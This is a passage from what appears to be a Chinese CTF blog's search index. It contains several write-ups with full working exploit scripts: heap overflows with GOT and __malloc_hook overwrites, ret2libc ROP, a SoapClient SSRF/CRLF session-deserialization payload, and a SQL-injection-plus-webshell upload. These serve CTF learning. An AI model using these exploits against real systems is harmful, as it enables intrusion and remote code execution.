&#123;\t\t\tprint_r($db-&gt;error);\t\t\texit;\t\t&#125;\t\t$oldname = UPLOAD_DIR . $result[&quot;filename&quot;] . $result[&quot;extension&quot;];\t\t$newname = UPLOAD_DIR . $req[&quot;newname&quot;] . $result[&quot;extension&quot;];\t\tif (file_exists($oldname)) &#123;\t\t\trename($oldname, $newname);\t\t&#125;\t\t$url = &quot;/&quot; . $newname;\t\techo &quot;Your file is rename, url:                &lt;a href=\\&quot;&#123;$url&#125;\\&quot; target=&#x27;_blank&#x27;&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;                &lt;a href=\\&quot;/\\&quot;&gt;go back&lt;/a&gt;&quot;;\t&#125;&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;\t&lt;title&gt;file manage&lt;/title&gt;\t&lt;base href=&quot;/&quot;&gt;\t&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;/head&gt;&lt;h3&gt;Rename&lt;/h3&gt;&lt;body&gt;\t&lt;form method=&quot;post&quot;&gt;\t\t&lt;p&gt;\t\t\t&lt;span&gt;old filename(exclude extension)：&lt;/span&gt;\t\t\t&lt;input type=&quot;text&quot; name=&quot;oldname&quot;&gt;\t\t&lt;/p&gt;\t\t&lt;p&gt;\t\t\t&lt;span&gt;new filename(exclude extension)：&lt;/span&gt;\t\t\t&lt;input type=&quot;text&quot; name=&quot;newname&quot;&gt;\t\t&lt;/p&gt;\t\t&lt;p&gt;\t\t\t&lt;input type=&quot;submit&quot; value=&quot;rename&quot;&gt;\t\t&lt;/p&gt;\t&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\n可以看到upload.php是不存在注入点的，由因为白名单限制没法上传一句话的文件。但是rename文件可以修改文件名。\nif ($result) &#123;    $req[&#x27;newname&#x27;] = basename($req[&#x27;newname&#x27;]);    $sql = &quot;update `file` set `filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#123;$result[&#x27;filename&#x27;]&#125;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot;;    $re = $db-&gt;query(&quot;update `file` set `filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#123;$result[&#x27;filename&#x27;]&#125;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot;);    if (!$re) &#123;        print_r($db-&gt;error);        exit;    &#125;    $oldname = UPLOAD_DIR . $result[&quot;filename&quot;] . $result[&quot;extension&quot;];    $newname = UPLOAD_DIR . $req[&quot;newname&quot;] . $result[&quot;extension&quot;];    if (file_exists($oldname)) &#123;        rename($oldname, $newname);    &#125;    $url = &quot;/&quot; . $newname;    echo &quot;Your file is rename, url:                &lt;a href=\\&quot;&#123;$url&#125;\\&quot; target=&#x27;_blank&#x27;&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;                &lt;a href=\\&quot;/\\&quot;&gt;go back&lt;/a&gt;&quot;;&#125;\n\n这里对于oldname没有检查和处理，并且在下面是直接修改文件名字。描述起来比较费劲，就直接上图吧。\n\n构造一个文件名为&#39;,extension=&#39;&#39;,filename=&#39;wow.gif.gif的文件上传，两个gif是用第二个去逃避那个extension字段\n\n\n数据库和upload文件夹的结果就是这样\n现在去rename一个\n\n在rename里面的sql语句就是这样，那此时的extension就被置空了\n\n\n这时候上传一个一句话wow.gif\n\n\n\n现在数据储存的就是这样两个，下一步直接rename，修改木马尾缀\n\n此时就是将oldname修改到newname了，用蚁剑连接就好了\n","categories":["web-buuctf"],"tags":["二次注入"]},{"title":"babyfengshui","url":"/2021/11/24/babyfengshui/","content":"检查程序\n打开了canary和nx但是是partial relro。\n流程分析void __cdecl __noreturn main()&#123;  char v0; // [esp+3h] [ebp-15h] BYREF  int v1; // [esp+4h] [ebp-14h] BYREF  int v2[4]; // [esp+8h] [ebp-10h] BYREF  v2[1] = __readgsdword(0x14u);  setvbuf(stdin, 0, 2, 0);  setvbuf(stdout, 0, 2, 0);  alarm(0x14u);  while ( 1 )  &#123;    puts(&quot;0: Add a user&quot;);    puts(&quot;1: Delete a user&quot;);    puts(&quot;2: Display a user&quot;);    puts(&quot;3: Update a user description&quot;);    puts(&quot;4: Exit&quot;);    printf(&quot;Action: &quot;);    if ( __isoc99_scanf(&quot;%d&quot;, &amp;v1) == -1 )      break;    if ( !v1 )    &#123;      printf(&quot;size of description: &quot;);      __isoc99_scanf(&quot;%u%c&quot;, v2, &amp;v0);      add_user(v2[0]);    &#125;    if ( v1 == 1 )    &#123;      printf(&quot;index: &quot;);      __isoc99_scanf(&quot;%d&quot;, v2);      delete_user(LOBYTE(v2[0]));    &#125;    if ( v1 == 2 )    &#123;      printf(&quot;index: &quot;);      __isoc99_scanf(&quot;%d&quot;, v2);      display_user(LOBYTE(v2[0]));    &#125;    if ( v1 == 3 )    &#123;      printf(&quot;index: &quot;);      __isoc99_scanf(&quot;%d&quot;, v2);      update_user(LOBYTE(v2[0]));    &#125;    if ( v1 == 4 )    &#123;      puts(&quot;Bye&quot;);      exit(0);    &#125;    if ( (unsigned __int8)byte_804B069 &gt; 0x31u )    &#123;      puts(&quot;maximum capacity exceeded, bye&quot;);      exit(0);    &#125;  &#125;  exit(1);&#125;\n\n可以看出来又是一道菜单题\nadd一个用户的时候\n_DWORD *__cdecl add_user(size_t a1)&#123;  void *s; // [esp+14h] [ebp-14h]  _DWORD *v3; // [esp+18h] [ebp-10h]  s = malloc(a1);  memset(s, 0, a1);  v3 = malloc(0x80u);  memset(v3, 0, 0x80u);  *v3 = s;  *(&amp;ptr + (unsigned __int8)byte_804B069) = v3;  printf(&quot;name: &quot;);  sub_80486BB((char *)*(&amp;ptr + (unsigned __int8)byte_804B069) + 4, 124);  update_user((unsigned __int8)byte_804B069++);  return v3;&#125;\n\nuser的结构体可以看成\nstruct user&#123;    int *description;// 存放description这个chunk的指针    char name[0x7c];&#125;\n\n\n\n这里没有堆溢出，堆溢出主要发生在update_user\nunsigned int __cdecl update_user(unsigned __int8 a1)&#123;  char v2; // [esp+17h] [ebp-11h] BYREF  int v3; // [esp+18h] [ebp-10h] BYREF  unsigned int v4; // [esp+1Ch] [ebp-Ch]  v4 = __readgsdword(0x14u);  if ( a1 &lt; (unsigned __int8)byte_804B069 &amp;&amp; *(&amp;ptr + a1) )  &#123;    v3 = 0;    printf(&quot;text length: &quot;);    __isoc99_scanf(&quot;%u%c&quot;, &amp;v3, &amp;v2);    if ( (char *)(v3 + *(_DWORD *)*(&amp;ptr + a1)) &gt;= (char *)*(&amp;ptr + a1) - 4 )    &#123;      puts(&quot;my l33t defenses cannot be fooled, cya!&quot;);      exit(1);    &#125;    printf(&quot;text: &quot;);    sub_80486BB(*(_DWORD *)*(&amp;ptr + a1), v3 + 1);  &#125;  return __readgsdword(0x14u) ^ v4;&#125;\n\n虽然写入的长度我们可控但是这里有一个限制条件\nif ( (char *)(v3 + *(_DWORD *)*(&amp;ptr + a1)) &gt;= (char *)*(&amp;ptr + a1) - 4 )\n\n翻译过来就是输入的长度加上description堆块的地址必须小于user堆块的地址\n利用思路虽然两个malloc是相邻的，但是不代表他们的chunk是相邻的，因为我们还可以删除控制bin。\n首先add两个description为0x20的用户(user_chunk已经默认为0x80了)\n然后delete第一个user，此时内存剩下来一个大小为0x20和0x80的chunk\n这个时候再add一个description为0x80的chunk，由于是先malloc description这个chunk所以他会占据我们delete掉的user的user_chunk\n这时候就可以进行堆溢出，堆溢出的思路就是覆盖掉第二个user的user_chunk的第三个字节也就是存放description指针的位置\n然后display第二个user就可以实现读取任意地址，update第二个就可以实现写入任意地址\nexpfrom pwn import *elf = ELF(&#x27;./babyfengshui/babyfengshui&#x27;)libc = ELF(&#x27;./babyfengshui/libc.so.6&#x27;)r = process(&#x27;./babyfengshui/babyfengshui&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 57741)context.log_level = &#x27;debug&#x27;free_got_addr = elf.got[&#x27;free&#x27;]def add_user(description_size, name, text_length, text):    r.recvuntil(b&#x27;Action: &#x27;)    r.sendline(b&#x27;0&#x27;)    r.recvuntil(b&#x27;size of description: &#x27;)    r.sendline(bytes(str(description_size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;name:&#x27;)    r.sendline(name)    r.recvuntil(b&#x27;text length:&#x27;)    r.sendline(bytes(str(text_length), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;text:&#x27;)    r.sendline(text)def delete_user(index):    r.recvuntil(b&#x27;Action: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;index: &#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf8&#x27;))def display_user(index):    r.recvuntil(b&#x27;Action: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;index: &#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf8&#x27;))def update_user(index, text_length, text):    r.recvuntil(b&#x27;Action: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;index: &#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;text length:&#x27;)    r.sendline(bytes(str(text_length), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;text:&#x27;)    r.sendline(text)def exit():    r.recvuntil(b&#x27;Action: &#x27;)    r.sendline(b&#x27;4&#x27;)if __name__ == &#x27;__main__&#x27;:    add_user(0x20, b&#x27;196082&#x27;, 0x20, b&#x27;a&#x27;*0x20)    add_user(0x20, b&#x27;196082&#x27;, 0x20, b&#x27;b&#x27;*0x20)    add_user(0x8, b&#x27;196082&#x27;, 0x8, b&#x27;/bin/sh\\x00&#x27;)    # gdb.attach(r)    # pause()    delete_user(0)    payload = b&#x27;c&#x27;*0x80+p32(0x90)+p32(0x31)+b&#x27;d&#x27;*0x20 + \\        p32(0x30)+p32(0x91)+p32(free_got_addr)    add_user(0x80, b&#x27;196082&#x27;, 0x8, &#x27;aaaa&#x27;)    update_user(3, len(payload), payload)    display_user(1)    r.recvuntil(b&#x27;description: &#x27;)    free_real_addr = u32(r.recv(4))# 有毒的地方是这道题的libc好像有点问题，我调了很久完全没问题，但是就是这玩意开始用的libc.symbols[&#x27;free&#x27;]就是打不通，看了大佬的wp发现是自己写的地址    offset = free_real_addr-0x070750    system_addr = offset+0x03a940    print(hex(free_real_addr))    print(hex(system_addr))    update_user(1, 4, p32(system_addr))    delete_user(2)    r.interactive()\n\n","categories":["pwn-xctf"],"tags":["堆溢出","篡改GOT表"]},{"title":"babyheap_0ctf_2017","url":"/2022/01/14/babyheap-0ctf-2017/","content":"突然之间发现自己的博客好像还没发过有关fastbin attack的内容，今天抽时间写了一篇\n检测保护\n保护全开。\n流程分析是一个很常规的菜单题。在create函数内部使用的calloc的生成chunk，区别就是会清理生成chunk的内部值。\nvoid __fastcall sub_D48(__int64 a1)&#123;  int i; // [rsp+10h] [rbp-10h]  int v2; // [rsp+14h] [rbp-Ch]  void *v3; // [rsp+18h] [rbp-8h]  for ( i = 0; i &lt;= 15; ++i )  &#123;    if ( !*(_DWORD *)(24LL * i + a1) )    &#123;      printf(&quot;Size: &quot;);      v2 = sub_138C();      if ( v2 &gt; 0 )      &#123;        if ( v2 &gt; 4096 )          v2 = 4096;        v3 = calloc(v2, 1uLL);        if ( !v3 )          exit(-1);        *(_DWORD *)(24LL * i + a1) = 1;        *(_QWORD *)(a1 + 24LL * i + 8) = v2;        *(_QWORD *)(a1 + 24LL * i + 16) = v3;        printf(&quot;Allocate Index %d\\n&quot;, (unsigned int)i);      &#125;      return;    &#125;  &#125;&#125;\n\nedit函数就只是判断了chunk是否存在，你写入的内容大小并没有判断，可以造成堆溢出\n__int64 __fastcall sub_E7F(__int64 a1)&#123;  __int64 result; // rax  int v2; // [rsp+18h] [rbp-8h]  int v3; // [rsp+1Ch] [rbp-4h]  printf(&quot;Index: &quot;);  result = sub_138C();  v2 = result;  if ( (int)result &gt;= 0 &amp;&amp; (int)result &lt;= 15 )  &#123;    result = *(unsigned int *)(24LL * (int)result + a1);    if ( (_DWORD)result == 1 )    &#123;      printf(&quot;Size: &quot;);      result = sub_138C();      v3 = result;      if ( (int)result &gt; 0 )      &#123;        printf(&quot;Content: &quot;);        result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);      &#125;    &#125;  &#125;  return result;&#125;\n\ndelete函数可以看到不存在UAF。\n__int64 __fastcall sub_F50(__int64 a1)&#123;  __int64 result; // rax  int v2; // [rsp+1Ch] [rbp-4h]  printf(&quot;Index: &quot;);  result = sub_138C();  v2 = result;  if ( (int)result &gt;= 0 &amp;&amp; (int)result &lt;= 15 )  &#123;    result = *(unsigned int *)(24LL * (int)result + a1);    if ( (_DWORD)result == 1 )    &#123;      *(_DWORD *)(24LL * v2 + a1) = 0;      *(_QWORD *)(24LL * v2 + a1 + 8) = 0LL;      free(*(void **)(24LL * v2 + a1 + 16));      result = 24LL * v2 + a1;      *(_QWORD *)(result + 16) = 0LL;    &#125;  &#125;  return result;&#125;\n\n正常的show函数\nint __fastcall sub_1051(__int64 a1)&#123;  int result; // eax  int v2; // [rsp+1Ch] [rbp-4h]  printf(&quot;Index: &quot;);  result = sub_138C();  v2 = result;  if ( result &gt;= 0 &amp;&amp; result &lt;= 15 )  &#123;    result = *(_DWORD *)(24LL * result + a1);    if ( result == 1 )    &#123;      puts(&quot;Content: &quot;);      sub_130F(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8));      result = puts(byte_14F1);    &#125;  &#125;  return result;&#125;\n\n利用分析因为前几天才做了off by one所以这道题的第一反应就是修改chunk的size，覆盖掉后面的就好做了。\n首先创建六个chunk\ncreate(0x10)  # 0create(0x50)  # 1create(0x50)  # 2create(0x60)  # 3create(0x60)  # 4create(0x10)  # 5\n\n然后通过chunk1修改chunk2的size，然后free掉chunk2，那么chunk2此时进入的就是unsorted bin了。\n\n然后又create大小为0x50的chunk那么此时就会切割unsorted bin当中的chunk\n\n此时的main_arena+88也就跑到了chunk3的位置，又因为没有delete掉chunk3所以直接可以泄漏main_arena，然后就是常规拿到__malloc_hook\nshow(3)r.recvuntil(b&#x27;Content: &#x27;)main_arena_88 = u64(r.recv(9)[1:])info(hex(main_arena_88))malloc_hook = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)info(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = libc_base+0x4526a\n\n下面就开始用fastbin attack了\nfastbin attack其实这个攻击方式跟tcache的很类似，不过tcache在2.27就是裸奔fastbin还要检测一下size位。\n\n这里有个满足条件的。\n然后就是把chunk弄过来，然后覆盖掉__malloc_hook就好了\nexpfrom pwn import *elf = ELF(&#x27;./babyheap_0ctf_2017&#x27;)r = process(&#x27;babyheap_0ctf_2017&#x27;)# r = remote(&#x27;node4.buuoj.cn&#x27;, 28943)libc = ELF(&#x27;./libc-2.23.so&#x27;)context.log_level = &#x27;debug&#x27;def create(size):    r.recvuntil(b&#x27;Command: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))def edit(id, size, data):    r.recvuntil(b&#x27;Command: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Content: &#x27;)    r.sendline(data)def delete(id):    r.recvuntil(b&#x27;Command: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def show(id):    r.recvuntil(b&#x27;Command: &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))create(0x10)  # 0create(0x50)  # 1create(0x50)  # 2create(0x60)  # 3create(0x60)  # 4create(0x10)  # 5edit(1, 0x60, b&#x27;a&#x27;*0x50+p64(0x60)+p64(0x140+1))edit(4, 0x60, b&#x27;a&#x27;*0x50+p64(0x140)+p64(0x20+1))delete(2)create(0x50)  # 2show(3)r.recvuntil(b&#x27;Content: &#x27;)main_arena_88 = u64(r.recv(9)[1:])info(hex(main_arena_88))malloc_hook = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)info(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = libc_base+0x4526acreate(0x60)  # 6create(0x60)  # 7delete(7)delete(3)delete(4)create(0x60)  # 3edit(3, 0x9, p64(malloc_hook-0x20+5-8))create(0x60)  # 6create(0x60)  # 7create(0x60)  # 8payload = b&#x27;a&#x27;*(0x20-5-8)+p64(one_gadget)info(hex(one_gadget))edit(8, len(payload), payload)# gdb.attach(r)create(1)r.interactive()\n\n","categories":["pwn-buuctf"],"tags":["fastbin attack"]},{"title":"bestphp's_revenge","url":"/2021/09/30/bestphp-s-revenge/","content":"这道题真不像看上去那样T_T\n先把源码附上\nindex.php\n&lt;?phphighlight_file(__FILE__);$b = &#x27;implode&#x27;;call_user_func($_GET[&#x27;f&#x27;], $_POST);session_start();if (isset($_GET[&#x27;name&#x27;])) &#123;    $_SESSION[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];&#125;var_dump($_SESSION);$a = array(reset($_SESSION), &#x27;welcome_to_the_lctf2018&#x27;);call_user_func($b, $a);?&gt; \n\nflag.php\nsession_start(); echo &#x27;only localhost can get flag!&#x27;; $flag = &#x27;LCTF&#123;*************************&#125;&#x27;; if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;     $_SESSION[&#x27;flag&#x27;] = $flag; &#125; only localhost can get flag!\n\n\n\n知识点这道题需要的知识点很多\nSoapClient内置类SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。SoapClient类可以创建soap数据报文，与wsdl接口进行交互。\nhttps://www.anquanke.com/post/id/153065#h2-1\n\n第一个wsdl就是是否开启wsdl后面数组就是请求的一些参数。\n跟去其他wp可以看出来__call方法是可以进行请求达到ssrf的。\n其实我本身还不怎么知道这个东西，下去看一下，不过多介绍\n\nCRLF Injection漏洞CRLF就是指的是’\\r\\n’，在http协议就是根据两个连续的CRLF来分辨header和body的，在这个题当中可以控制user_agent进而控制cookie就行\n\ncall_user_func冷知识总所周知\n\n前面是回调函数，后面是参数。但是还有个冷知识就是\n\n在下面，可以调用类当中的方法。\nsession反序列化session反序列化不陌生，也就是key|反序列化的value，但是也会有其他的保存形式，也是因为用了不同的引擎反序列化的结果\n当 session.serialize_handler=php 时，session文件内容为： name|s:6:&quot;196082&quot;;\n当 session.serialize_handler=php_serialize 时，session文件为： a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;196082&quot;;&#125;\n当 session.serialize_handler=php_binary 时，session文件内容为： 二进制字符names:6:&quot;196082&quot;;\n也就是当开始使用php_serialize反序列化时(eg:$_SESSION[&#39;name&#39;]=&#39;|196082&#39;)\n结果\na:1:&#123;s:4:&quot;name&quot;;s:7:&quot;|196082&quot;;&#125;\n\n然后再用php引擎去解析这段的时候就被解析成\nkey:a:1:&#123;s:4:&quot;name&quot;;s:7:&quot;value:196082&quot;;&#125;\n\n然而value会被进行反序列化\n再就是php7当中session_start()函数可以接收一个数组参数，然后覆盖掉php.ini当中的配置，在这里可以用来更换引擎\n解题第一步就是将SoapClient反序列化写入到session文件当中\nexp.php\n&lt;?php$payload = new SoapClient(null, array(    &#x27;location&#x27; =&gt; &#x27;http://127.0.0.1/flag.php&#x27;,    &#x27;user_agent&#x27; =&gt; &quot;zzz\\r\\nCookie:PHPSESSID=na228cb7qlhrv6tjgb9k45v5e4&quot;,    &#x27;uri&#x27; =&gt; &#x27;http://127.0.0.1&#x27;));$payload = serialize($payload);echo &#x27;|&#x27; . urlencode($payload);\n\n这里的PHPSESSID写自己的\n得到payload\n|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A16%3A%22http%3A%2F%2F127.0.0.1%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A48%3A%22zzz%0D%0ACookie%3APHPSESSID%3Dna228cb7qlhrv6tjgb9k45v5e4%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D\n\n\n将f复制成session_start然后POST传参然后覆盖掉php.ini的配置项，让序列化的引擎是php_serialize\n\n返回的数据表示我们写入成功了\n下面就是利用extract进行赋值，让$b=call_user_func这样就行成了array(reset($_SESSION),’welcome_to_the_lctf2018’)，因为并不存在welcome_to_the_lctf2018方法所以直接调用了call\n\n接下来注意上面的call_user_func的图片，其他wp都是说调用了SoapClient类当中的方法，但是我实在想不通，因为即便是上面这串payload被反序列化原本的内置类里面的参数也不受影响(我在这里卡了很久，不知到为什么其他师傅wp说调用了类的方法)，注意那里的题目中的reset函数，他是将指针指向数组第一个元素，这里也就是我们序列化的那串字符串，所以实际上这里调用的是反序列化得到的对象的方法，进行的ssrf\n然后直接在页面刷新\n\n获得flag\n总结，题目质量很高，涵盖了许多知识点，只不过我太菜了，就得地方卡了好久，下去还要好好看看相关内容。\n参考文章:https://www.cnblogs.com/NPFS/p/14335370.html\n","categories":["web-buuctf"],"tags":["session反序列化","php内置类SoapClint","call_user_func","CRLF Injection漏洞"]},{"title":"ciscn_2019_c_1","url":"/2021/09/19/ciscn-2019-c-1/","content":"获取基本信息\n\n然后进入ida进行分析\n分析程序// local variable allocation has failed, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v4; // [rsp+Ch] [rbp-4h]  init(*(_QWORD *)&amp;argc, argv, envp);  puts(&quot;EEEEEEE                            hh      iii                &quot;);  puts(&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;);  puts(&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;);  puts(&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;);  puts(&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;);  puts(&quot;====================================================================&quot;);  puts(&quot;Welcome to this Encryption machine\\n&quot;);  begin(&quot;Welcome to this Encryption machine\\n&quot;);  while ( 1 )  &#123;    while ( 1 )    &#123;      fflush(0LL);      v4 = 0;      __isoc99_scanf(&quot;%d&quot;, &amp;v4);      getchar();      if ( v4 != 2 )        break;      puts(&quot;I think you can do it by yourself&quot;);      begin(&quot;I think you can do it by yourself&quot;);    &#125;    if ( v4 == 3 )    &#123;      puts(&quot;Bye!&quot;);      return 0;    &#125;    if ( v4 != 1 )      break;    encrypt();    begin(&quot;%d&quot;);  &#125;  puts(&quot;Something Wrong!&quot;);  return 0;&#125;\n\nint begin()&#123;  puts(&quot;====================================================================&quot;);  puts(&quot;1.Encrypt&quot;);  puts(&quot;2.Decrypt&quot;);  puts(&quot;3.Exit&quot;);  return puts(&quot;Input your choice!&quot;);&#125;\n\nint encrypt()&#123;  size_t v0; // rbx  char s[48]; // [rsp+0h] [rbp-50h]  __int16 v3; // [rsp+30h] [rbp-20h]  memset(s, 0, sizeof(s));  v3 = 0;  puts(&quot;Input your Plaintext to be encrypted&quot;);  gets(s);  while ( 1 )  &#123;    v0 = (unsigned int)x;    if ( v0 &gt;= strlen(s) )      break;    if ( s[x] &lt;= 96 || s[x] &gt; 122 )    &#123;      if ( s[x] &lt;= 64 || s[x] &gt; 90 )      &#123;        if ( s[x] &gt; 47 &amp;&amp; s[x] &lt;= 57 )          s[x] ^= 0xFu;      &#125;      else      &#123;        s[x] ^= 0xEu;      &#125;    &#125;    else    &#123;      s[x] ^= 0xDu;    &#125;    ++x;  &#125;  puts(&quot;Ciphertext&quot;);  return puts(s);&#125;\n\n发现只有encrypt存在栈溢出，所以就选1就好了。然后在encrypt函数里面我们是肯定不想自己的数据被处理，这样就会让辛辛苦苦的payload没了，所以就可以绕过，前面加一个’\\0’。\n发现程序并没有找到system函数和’/bin/sh’字符串，所以只能自己想办法调用了。\n攻击思路通过构造ROP执行puts打印出puts存在的真实地址==&gt;根据puts地址找到对应的libc文件==&gt;在libc文件中找到我们需要的函数和字符串==&gt;计算libc中函数和程序本身函数地址的偏移量==&gt;根据偏移量找到函数getshell\namd64函数的参数放在rdi,rsi,rdx,rcx,r8,r9当中，而i386函数的参数是直接寻址的。所以我们想要构建ROP就必须存在pop rdi;ret\n\n可以找到两个命令的地址为0x400c83。\n最终get_shellexp.py\nfrom pwn import *from LibcSearcher import *context(os=&#x27;Linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;DEBUG&#x27;)elf = ELF(&#x27;./questions/ciscn_2019_c_1&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 27809)plt_puts_addr = elf.plt[&#x27;puts&#x27;]got_puts_addr = elf.got[&#x27;puts&#x27;]main_addr = elf.symbols[&#x27;main&#x27;]pop_rdi_addr = 0x400c83payload = b&#x27;\\0&#x27; + b&#x27;a&#x27; * (0x50 + 0x08 - 1) + p64(pop_rdi_addr) + \\    p64(got_puts_addr) + p64(plt_puts_addr) + p64(main_addr)r.recvuntil(b&#x27;Input your choice!\\n&#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;Input your Plaintext to be encrypted\\n&#x27;)r.sendline(payload)r.recvuntil(b&#x27;Ciphertext\\n&#x27;)r.recvuntil(b&#x27;\\n&#x27;)real_put_addr = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=False)[:-1].ljust(8, b&#x27;\\0&#x27;))libc = LibcSearcher(&#x27;puts&#x27;, real_put_addr)lib_puts_addr = libc.dump(&#x27;puts&#x27;)lib_system_addr = libc.dump(&#x27;system&#x27;)lib_shell_addr = libc.dump(&#x27;str_bin_sh&#x27;)offset = real_put_addr - lib_puts_addrreal_system_addr = lib_system_addr + offsetreal_shell_addr = lib_shell_addr + offsetret_addr = 0x4006b9payload = b&#x27;\\0&#x27; + b&#x27;a&#x27; * (0x50 + 0x08 - 1) + p64(ret_addr) + p64(pop_rdi_addr) + \\    p64(real_shell_addr) + p64(real_system_addr)print(&#x27;len-&gt;&#x27;, len(payload))r.recvuntil(b&#x27;Input your choice!\\n&#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;Input your Plaintext to be encrypted\\n&#x27;)r.sendline(payload)r.interactive()\n\n开始先获取puts在plt表的位置，然后获取puts在got表的位置(got表内部保存的是puts的真实地址)，然后获得程序main函数的地址\npayload1:    b&#x27;\\0&#x27; 用去绕过加密，这个长度为0所以会break掉\t然后填充垃圾字符实现栈溢出    将ret位置地址改为前面我们说的pop_rip;ret    再继续填充栈第一个写上puts参数也就是puts在got表的位置，因为我们要获取got表里面的实际位置    这个plt表用来ret，ret会将pop rip    最后一个就是执行完puts执行main函数payload2：\t有区别的就是p64(ret_addr)这是因为题目环境是ubuntu18所以要考虑到栈平衡\n\n","categories":["pwn-buuctf"],"tags":["ROP","stack overflow"]},{"title":"ciscn_2019_n_1","url":"/2021/09/18/ciscn-2019-n-1/","content":"获取文件基本信息\n\n\n发现是一个64位的程序，然后打开了NX保护(在栈上的内容不可执行)\n程序内容让我们猜数字\n分析程序程序的结构比较简单，直接使用gdb调试(主要是我使用gdb不是特别熟练所以想多用gdb让用起来熟练点)\n\n首先下断点到main函数然后运行程序\n\n然后可以看到会进入到一个函数名为func的函数\nida反汇编的func函数:\nint func()&#123;  int result; // eax  char v1; // [rsp+0h] [rbp-30h]  float v2; // [rsp+2Ch] [rbp-4h]  v2 = 0.0;  puts(&quot;Let&#x27;s guess the number.&quot;);  gets(&amp;v1);  if ( v2 == 11.28125 )    result = system(&quot;cat /flag&quot;);  else    result = puts(&quot;Its value should be 11.28125&quot;);  return result;&#125;\n\n\n\n\n是拿\n这个常量和v2作比较，然后这个常量的值为11.28125浮点型数据，无法用p64直接上成payload。但是浮点型在程序的存在形式也是16进制的形式所以在ida中找到这个地址所对应的值就可以拿去生成payload\n最后exp.py:\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./questions/ciscn_2019_n_1&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 28839)payload = b&#x27;a&#x27;*(0x30-0x4) + p64(0x41348000)r.recvuntil(b&quot;Let&#x27;s guess the number.\\n&quot;)r.sendline(payload)r.interactive()\n\n","categories":["pwn-buuctf"],"tags":["pwn"]},{"title":"easyfmt","url":"/2021/12/17/easyfmt/","content":"朝着今年更到50篇进发！！！\n检查保护\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  char buf[264]; // [rsp+10h] [rbp-110h] BYREF  unsigned __int64 v4; // [rsp+118h] [rbp-8h]  v4 = __readfsqword(0x28u);  setvbuf(_bss_start, 0LL, 2, 0LL);  